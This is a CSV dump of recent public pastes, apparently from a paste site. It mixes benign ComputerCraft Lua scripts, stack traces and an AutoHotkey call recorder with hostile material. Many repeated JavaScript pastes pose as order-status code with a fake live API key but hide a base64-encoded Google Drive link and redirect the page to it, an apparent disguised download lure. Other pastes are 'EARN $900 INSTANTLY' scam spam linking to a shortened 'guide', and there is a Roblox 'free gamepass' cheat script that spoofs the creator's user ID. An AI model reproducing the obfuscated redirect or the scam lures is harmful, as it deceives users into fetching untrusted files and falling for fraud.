id,title,username,language,date,content
nawJYmgK,2025-04-12T02:16:54.067705,powerampache,PHP,Friday 11th of April 2025 07:16:54 PM CDT,"1.01-79-play (79) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""Too many follow-up requests: 21"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

"
LrN3303u,Products.js,Ratqueenkslskskwkw,JavaScript,Friday 11th of April 2025 07:15:21 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/69152/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
cx30trSK,EARN $900 INSTANTLY 2025 2U,Monnalisa,JavaScript,Friday 11th of April 2025 07:09:38 PM CDT," 
Pdf https://tinyurl.com/privguidee


QKKPHVPXn1
"
0NUUPfvw,Make $1000 15-MINUTES (BEGINNER) FM,Monnalisa,JavaScript,Friday 11th of April 2025 06:56:13 PM CDT," 
Pdf https://tinyurl.com/privguidee


Ymw64Yhu3z
"
Xb2Eb8S8,Order.js,Ratqueenkslskskwkw,JavaScript,Friday 11th of April 2025 06:54:44 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/68442/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WWxHcbq2,EARN $900 INSTANTLY 2025⭐ G8,Monnalisa,JavaScript,Friday 11th of April 2025 06:42:46 PM CDT," 
Pdf https://tinyurl.com/privguidee


B8f8R9nkVp
"
X0SDAWRi,Market.js,Ratqueenkslskskwkw,JavaScript,Friday 11th of April 2025 06:39:21 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/88283/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FdZZw7DT,Make $1000 15-MINUTES  (BEGINNER) HV,Monnalisa,JavaScript,Friday 11th of April 2025 06:29:20 PM CDT," 
Pdf https://tinyurl.com/privguidee


joMv1Jd01Y
"
gcAWEhYN,Untitled,Ratqueenkslskskwkw,JavaScript,Friday 11th of April 2025 06:23:57 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/72319/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
d6wXLsvL,Branch,ZGAMMAA,Lua,Friday 11th of April 2025 06:12:13 PM CDT,"-- Branch Mining Turtle Program
-- Digs 2-high main tunnel with branches every 2 blocks
-- Ignores cobblestone, returns to refuel/unload at origin

-- === CONFIG ===
local MAIN_TUNNEL_LENGTH = 50      -- Length of the main tunnel
local BRANCH_LENGTH = 6            -- How far each side branch goes
local BRANCH_SPACING = 2           -- How often to branch
local TORCH_INTERVAL = 10
local TORCH_SLOT = 16
local FUEL_BUFFER = 100

-- === STATE ===
local step = 0
local x, y, z, dir = 0, 0, 0, 1 -- Assume facing East
local startX, startY, startZ, startDir = 0, 0, 0, 1

local cobbleNames = {
  [""minecraft:cobblestone""] = true,
  [""minecraft:stone""] = true,
  [""minecraft:gravel""] = true
}

-- === DIRECTION ===
local function update(dx, dy, dz) x, y, z = x + dx, y + dy, z + dz end
local function turnRight() turtle.turnRight(); dir = (dir + 1) % 4 end
local function turnLeft() turtle.turnLeft(); dir = (dir - 1) % 4 end
local function face(d) while dir ~= d do turnRight() end end

-- === MOVEMENT ===
local function tryForward()
  while not turtle.forward() do turtle.dig(); sleep(0.2) end
  if dir == 0 then update(0, 0, -1)
  elseif dir == 1 then update(1, 0, 0)
  elseif dir == 2 then update(0, 0, 1)
  elseif dir == 3 then update(-1, 0, 0) end
end

local function tryUp()
  while not turtle.up() do turtle.digUp(); sleep(0.2) end
  update(0, 1, 0)
end

local function tryDown()
  while not turtle.down() do turtle.digDown(); sleep(0.2) end
  update(0, -1, 0)
end

-- === POSITIONING ===
local function goTo(tx, ty, tz)
  while y > ty do tryUp() end
  while y < ty do tryDown() end
  if x < tx then face(1) while x < tx do tryForward() end end
  if x > tx then face(3) while x > tx do tryForward() end end
  if z < tz then face(2) while z < tz do tryForward() end end
  if z > tz then face(0) while z > tz do tryForward() end end
end

local function returnToOrigin()
  goTo(startX, startY, startZ)
  face(startDir)
end

-- === INVENTORY ===
local function isFull()
  for i = 1, 15 do
    if turtle.getItemCount(i) == 0 then return false end
  end
  return true
end

local function dropCobble()
  for i = 1, 15 do
    local detail = turtle.getItemDetail(i)
    if detail and cobbleNames[detail.name] then
      turtle.select(i)
      turtle.drop()
    end
  end
end

local function unloadInventory()
  print(""📦 Unloading..."")
  local ox, oy, oz, od = x, y, z, dir
  returnToOrigin()
  face((startDir + 2) % 4)
  for i = 1, 15 do turtle.select(i); turtle.drop() end
  face(startDir)
  goTo(ox, oy, oz); face(od)
end

-- === FUEL ===
local function refuelIfNeeded()
  if turtle.getFuelLevel() == ""unlimited"" or turtle.getFuelLevel() > FUEL_BUFFER then return end
  print(""🔋 Refueling..."")
  local ox, oy, oz, od = x, y, z, dir
  returnToOrigin()
  face((startDir - 1) % 4)
  for i = 1, 16 do
    turtle.select(i)
    if turtle.suck() and turtle.refuel() then break end
  end
  face(startDir)
  goTo(ox, oy, oz); face(od)
end

-- === DIGGING ===
local function digTunnelSection()
  turtle.dig()
  tryForward()
  turtle.digUp()
  tryUp()
  placeTorch()
  tryDown()
end

-- === TORCH ===
local function placeTorch()
  if step % TORCH_INTERVAL == 0 then
    turtle.select(TORCH_SLOT)
    turtle.placeUp()
    print(""🕯️ Torch placed"")
  end
end

local function digBranch(dirOffset)
  local originalDir = dir
  if dirOffset == ""left"" then turnLeft() else turnRight() end
  for i = 1, BRANCH_LENGTH do
    turtle.dig()
    tryForward()
    turtle.digUp()
    tryUp()
    tryDown()
  end
  -- Turn around and return
  turnRight(); turnRight()
  for i = 1, BRANCH_LENGTH do tryForward() end
  face(originalDir)
end

-- === MAIN ===
startX, startY, startZ, startDir = x, y, z, dir
print(""🚜 Starting branch mining..."")

for i = 1, MAIN_TUNNEL_LENGTH do
  digTunnelSection()
  step = step + 1

  if step % BRANCH_SPACING == 0 then
    digBranch(""left"")
    digBranch(""right"")
  end

  dropCobble()
  if isFull() then unloadInventory() end
  refuelIfNeeded()
end

returnToOrigin()
print(""✅ Mining complete. Returned to start."")"
c1f8hJcv,Products.js,Ratqueenkslskskwkw,JavaScript,Friday 11th of April 2025 06:08:33 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/20209/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
2sJZ3YiV,Order.js,Ratqueenkslskskwkw,JavaScript,Friday 11th of April 2025 05:52:58 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/73824/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
CeeHSbge,Roblox Free Gamepass Script,Steamhesaproblox,RBScript,Friday 11th of April 2025 05:40:44 PM CDT,"local Players = game:GetService(""Players"")
local LocalPlayer = Players.LocalPlayer


if game.CreatorType == Enum.CreatorType.User then
    LocalPlayer.UserId = game.CreatorId
elseif game.CreatorType == Enum.CreatorType.Group then
    local success, groupInfo = pcall(function()
        return game:GetService(""GroupService""):GetGroupInfoAsync(game.CreatorId)
    end)
    if success then
        LocalPlayer.UserId = groupInfo.Owner.Id
    end
end


local screenGui = Instance.new(""ScreenGui"")
screenGui.Name = ""ElmasHileGui""
screenGui.ResetOnSpawn = false
screenGui.Parent = LocalPlayer:WaitForChild(""PlayerGui"")

local textLabel = Instance.new(""TextLabel"")
textLabel.Parent = screenGui
textLabel.Text = ""Elmas Hile sizlere sunar""
textLabel.Size = UDim2.new(0, 250, 0, 50)
textLabel.Position = UDim2.new(1, -260, 1, -60)
textLabel.BackgroundTransparency = 0.5
textLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
textLabel.Font = Enum.Font.SourceSansBold
textLabel.TextSize = 20
textLabel.TextStrokeTransparency = 0.2
textLabel.BorderSizePixel = 0"
zr06a3Gz,Market.js,Ratqueenkslskskwkw,JavaScript,Friday 11th of April 2025 05:37:36 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/41297/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
5ApA7FSW,cc_bouncing,dengmahalYT,Lua,Friday 11th of April 2025 05:24:04 PM CDT,"---@diagnostic disable: unused-function
local function wrapPs(peripheralName)
    local periTab={}
    local sideTab={}
    if peripheralName==nil then
        print(""Error"")
    end
    local peripherals = peripheral.getNames()
    local i2 = 1
    for i =1, #peripherals do
        if peripheral.getType(peripherals[i])==peripheralName then
            periTab[i2]=peripheral.wrap(peripherals[i])
            sideTab[i2]=peripherals[i]
            i2=i2+1
        end
    end
    if periTab~={} then
        return periTab,sideTab
    else
        return nil
    end
end
--local mon=wrapPs(""monitor"")[1]
--local SX,SY=mon.getSize()
local cs = {
	colors.red,        -- R
	colors.orange,     -- O
	colors.yellow,     -- Y
	colors.lime,       -- G (lime as a bright green)
	colors.green,      -- G (darker green)
	colors.lightBlue,  -- B (light blue, before deeper blues)
	colors.cyan,       -- B (cyan fits between lightBlue and blue)
	colors.blue,       -- B (standard blue)
	colors.purple,     -- I (indigo)
	colors.magenta,    -- V (magenta as a pinkish violet)
	colors.pink,       -- extra (soft violet range)
	colors.white,      -- neutral (not in rainbow)
	colors.lightGray,  -- neutral
	colors.gray,       -- neutral
	colors.brown       -- extra (not in rainbow)
}
local ci=1

local SX,SY=term.getSize()
local speed=7
local dt=1/7
local posx=math.random(3,SX-3)
local posy=math.random(3,SY-3)
local velx=speed*math.cos(0.25*math.pi)
local vely=speed*math.sin(0.25*math.pi)
local dimx=1
local dimy=1

local function sign(x)
	if x<0 then
		return -1
	else
		return 1
	end
end
local LX=false
local LY=false
local hits=0
if not fs.exists(""score"") then
	local file=fs.open(""score"",""w"")
	file.write(""0"")
	file.close()
else
	local file=fs.open(""score"",""r"")
	local content=file.readAll()
	hits=tonumber(content)
	file.close()
end
while true do
	posx=posx+velx*dt
	posy=posy+vely*dt
	local PX=math.floor(posx+0.5)
	local PY=math.floor(posy+0.5)
	local hs=0
	if ((posx+dimx)>SX or posx<1)and LX==false then
		velx=-velx
		LX=true
		hs=hs+1
	elseif not ((posx+dimx)>SX or posx<1) then
		LX=false
	end
	if ((posy+dimy)>SY or posy<1)and LY==false then
		vely=-vely
		LY=true
		hs=hs+1
	elseif not ((posy+dimy)>SY or posy<1) then
		LY=false
	end
	if hs==2 then
		hits=hits+1
		--local naf=math.atan(vely,velx)+math.random(-0.01,0.01)
		--velx=speed*math.cos(naf)
		--vely=speed*math.sin(naf)
		local file=fs.open(""score"",""w"")
		file.write(tostring(hits))
		file.close()
	end
	ci=ci+1
	if ci>#cs then
		ci=1
	end
	term.clear()
	paintutils.drawFilledBox(0,0,SX,SY,colours.black)
	paintutils.drawBox(PX, PY,PX+dimx, PY+dimy,cs[ci])
	term.setCursorPos(1, 1)
	term.setBackgroundColor(colours.black)
	term.setTextColour(colours.green)
	term.write(""Hits: ""..hits)
	sleep(dt)
end"
XMmrZHGL,tunnel,DevilTvLP,Lua,Friday 11th of April 2025 04:51:30 PM CDT,"function forward()
	while not turtle.forward() do
		turtle.dig()
		os.sleep(0.2)
	end
	turtle.digUp()
	if not turtle.detectDown() then
		turtle.select(1)
		turtle.placeDown()
	end
end

function tunnel()
	forward()
	turtle.digUp()
	
	turtle.turnLeft()
	while turtle.detect() do
		turtle.dig()
		os.sleep(0.5)
	end
	turtle.up()
	turtle.dig()
	
	turtle.turnRight()
	turtle.turnRight()
	while turtle.detect() do
		turtle.dig()
		os.sleep(0.5)
	end
	turtle.down()
	turtle.dig()
	turtle.turnLeft()
end

print(""1.Slot Cobblestone\n\n"")
write(""Laenge: "")
w = io.read()

for i = 1, w do
	tunnel()
end"
iyzQT4zR,Messanger (72C51178B/0Y),Nimda,HTML 5,Friday 11th of April 2025 04:46:12 PM CDT,NO MESSAGE
UyB5VGej,Untitled,Ratqueenkslskskwkw,JavaScript,Friday 11th of April 2025 04:42:22 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/84094/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Q8aWV1Bm,Products.js,kammex,JavaScript,Friday 11th of April 2025 04:26:57 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/16239/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pFwiEATc,2025-04-11T18:19:46.016553,powerampache,PHP,Friday 11th of April 2025 04:19:47 PM CDT,"1.01-79-play (79) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""Unable to resolve host ""umbrel.tail94509.ts.net"": No address associated with hostname"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

"
RZcktyRZ,Untitled,Hsiang_Nianian,Lua,Friday 11th of April 2025 04:15:49 PM CDT,"local files = {
  ""artist/core/context.lua"",
  ""artist/core/items.lua"",
  ""artist/gui/core.lua"",
  ""artist/gui/extra.lua"",
  ""artist/gui/interface.lua"",
  ""artist/gui/interface/pickup_chest.lua"",
  ""artist/gui/interface/turtle.lua"",
  ""artist/gui/item_list.lua"",
  ""artist/init.lua"",
  ""artist/items/annotate.lua"",
  ""artist/items/annotations.lua"",
  ""artist/items/cache.lua"",
  ""artist/items/dropoff.lua"",
  ""artist/items/furnaces.lua"",
  ""artist/items/inventories.lua"",
  ""artist/items/trashcan.lua"",
  ""artist/lib/class.lua"",
  ""artist/lib/concurrent.lua"",
  ""artist/lib/config.lua"",
  ""artist/lib/log.lua"",
  ""artist/lib/mediator.lua"",
  ""artist/lib/serialise.lua"",
  ""artist/lib/tbl.lua"",
  ""artist/lib/turtle.lua"",
  ""artist/lib/widget.lua"",
  ""launch.lua"",
  ""metis/input/keybinding.lua"",
  ""metis/string/fuzzy.lua"",
}
local tasks = {}
for i, path in ipairs(files) do
  tasks[i] = function()
    local req, err = http.get(""https://ghproxy.hydroroll.team/raw.githubusercontent.com/SquidDev-CC/artist/refs/heads/vnext/src/"" .. path)
    if not req then error(""Failed to download "" .. path .. "": "" .. err, 0) end

    local file = fs.open("".artist.d/src/"" .. path, ""w"")
    file.write(req.readAll())
    file.close()

    req.close()
  end
end

parallel.waitForAll(table.unpack(tasks))

io.open(""artist.lua"", ""w""):write('shell.run("".artist.d/src/launch.lua"")'):close()

print(""Artist successfully installed! Run /artist.lua to start."")
"
tGf3qmaD,TrayCallRecorder,J2897,Autohotkey,Friday 11th of April 2025 04:11:51 PM CDT,"#Requires AutoHotkey v2.0+
#SingleInstance Force
#Warn All, Off

; ==============================================================================
; Script Name: Call Recorder for FFmpeg
; Synopsis: 
;   This script manages audio recordings using FFmpeg. It captures audio from a 
;   specified microphone and saves recordings with timestamped filenames. 
;   The user can control recording via a system tray menu or hotkeys:
;     - Ctrl+Alt+R: Start recording
;     - Ctrl+Alt+S: Stop recording
;     - Ctrl+Alt+X: Exit the application gracefully
;   
;   Additional Features:
;     - Automatically creates a log directory if it doesn’t exist.
;     - Verifies the FFmpeg executable location.
;     - Ensures only one instance is running.
;     - Provides clear tooltips for user feedback.
;
;   Prerequisites:
;     - AutoHotkey v2.0+
;     - FFmpeg installed at the specified location.
;     - Correct microphone name matching the system device.
; ==============================================================================

; --------------------------------------------------------------
;         CONFIGURATION
; --------------------------------------------------------------
class Config {
    static FFmpegPath := ""C:\Users\J2897\Programs\ffmpeg\bin\ffmpeg.exe""
    static MicName    := ""Microphone (2- High Definition Audio Device)""
    static OutputDir  := A_ScriptDir
    static LogDir     := A_ScriptDir ""\Logs""
    static StartDelay := 2000
}

; --------------------------------------------------------------
;          APPLICATION STATE
; --------------------------------------------------------------
class State {
    static ffmpegPID := 0
    static IsRecording => this.ffmpegPID != 0 && ProcessExist(this.ffmpegPID)
    
    static Clear() {
        this.ffmpegPID := 0
    }
}

; --------------------------------------------------------------
;            TRAY MENU
; --------------------------------------------------------------
CreateTrayMenu() {
    A_TrayMenu.Delete()
    A_TrayMenu.Add(""&Start Recording"", (*) => StartRecording())
    A_TrayMenu.Add(""&Stop Recording"", (*) => StopRecording())
    A_TrayMenu.Add()
    A_TrayMenu.Add(""E&xit"", (*) => ExitAppGracefully())
    UpdateTrayMenu()
}

UpdateTrayMenu() {
    ; Use separate Enable/Disable methods
    if State.IsRecording {
        A_TrayMenu.Disable(""&Start Recording"")
        A_TrayMenu.Enable(""&Stop Recording"")
    } else {
        A_TrayMenu.Enable(""&Start Recording"")
        A_TrayMenu.Disable(""&Stop Recording"")
    }
}

; --------------------------------------------------------------
;            HOTKEYS
; --------------------------------------------------------------
^!R:: StartRecording()
^!S:: StopRecording()
^!X:: ExitAppGracefully()

; --------------------------------------------------------------
;          INITIALIZATION
; --------------------------------------------------------------
CreateTrayMenu()
ShowToolTip(""Call Recorder Initialized."" 
    . ""`nRight-click the tray icon for options."" 
    . ""`nHotkeys available:"" 
    . ""`n   Ctrl+Alt+R: Start Recording"" 
    . ""`n   Ctrl+Alt+S: Stop Recording"" 
    . ""`n   Ctrl+Alt+X: Exit"", 1, 5000)
return

; --------------------------------------------------------------
;           FUNCTIONS
; --------------------------------------------------------------
StartRecording() {
    if State.IsRecording {
        ShowToolTip(""Recording already in progress!"", 2, 2000)
        return
    }

    if !FileExist(Config.FFmpegPath) {
        MsgBox(""FFmpeg not found at:`n"" Config.FFmpegPath, ""Error"", 0x30)
        return
    }

    if !DirExist(Config.LogDir)
        DirCreate(Config.LogDir)
    
    timestamp := FormatTime(, ""yyyy-MM-dd_HH-mm-ss"")
    outputFile := Config.OutputDir ""\Call_"" timestamp "".wav""

	cmd := Format(
		'cmd /c """"{1}"" -hide_banner -f dshow -i audio=""{2}"" -ac 2 -y ""{3}"" & pause""',
		Config.FFmpegPath,
		Config.MicName,
		outputFile
	)

    try {
        State.ffmpegPID := Run(cmd, Config.OutputDir,, &pid)
        Sleep Config.StartDelay
        
        if !ProcessExist(pid) || !FileExist(outputFile) {
            throw Error(""FFmpeg failed to initialize"")
        }
        State.ffmpegPID := pid
        UpdateTrayMenu()
    }
    catch Error as e {
        State.Clear()
        MsgBox(""Startup Error: "" e.Message, ""Error"", 0x30)
        return
    }

    ShowToolTip(""RECORDING STARTED (PID: "" State.ffmpegPID "")"", 2, 2000)
    UpdateTrayMenu()
}

StopRecording() {
    if !State.IsRecording {
        ShowToolTip(""No active recording to stop"", 2, 2000)
        return
    }

    ShowToolTip(""Stopping recording..."", 2, 2000)
    
    try {
        WinActivate(""ahk_pid "" State.ffmpegPID)
        ControlSend(""q"",, ""ahk_pid "" State.ffmpegPID)
        
        if ProcessWaitClose(State.ffmpegPID, 2) {
            ShowToolTip(""Stopped gracefully"", 2, 2000)
        } else {
            ProcessClose(State.ffmpegPID)
            ShowToolTip(""Force-closed recording"", 2, 2000)
        }
    }
    catch Error as e {
        MsgBox(""Stop Error: "" e.Message, ""Error"", 0x30)
    }
    
    State.Clear()
    UpdateTrayMenu()
}

ExitAppGracefully() {
    if State.IsRecording {
        result := MsgBox(""Recording in progress. Stop and exit?"", ""Confirm Exit"", 0x34)
        if result = ""Yes""
            StopRecording()
        else
            return
    }
    ExitApp()
}

ShowToolTip(text, id := 1, timeout := 0) {
    ToolTip(text,,, id)
    if timeout > 0
        SetTimer(() => ToolTip(,,, id), -timeout)
}"
Lq4gZRnk,Order.js,kammex,JavaScript,Friday 11th of April 2025 04:11:12 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/44099/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

